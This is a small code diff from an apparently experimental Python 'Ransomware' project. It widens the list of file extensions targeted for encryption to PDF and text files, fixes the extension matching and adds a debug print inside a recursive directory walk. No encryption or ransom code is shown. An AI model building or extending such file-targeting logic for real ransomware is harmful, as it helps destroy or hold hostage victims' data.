@@ -4,7 +4,7 @@ from os import listdir
 
 import encrypt
 
-encr=['.pdf']
+encr=['pdf','txt']
 
 def movein(dirpath='/home/ashwin/Documents/projects/Ransomware'):
     for each in listdir(dirpath):
@@ -17,7 +17,8 @@ def movein(dirpath='/home/ashwin/Documents/projects/Ransomware'):
             movein(fpath)
         elif isfile(fpath):
             # print('isFile')
-            extension=splitext(fpath)[1]
+            extension=splitext(fpath)[1][1:]
+            print(extension)
             # print(extension)
             if extension in encr:
                 # print(fpath)
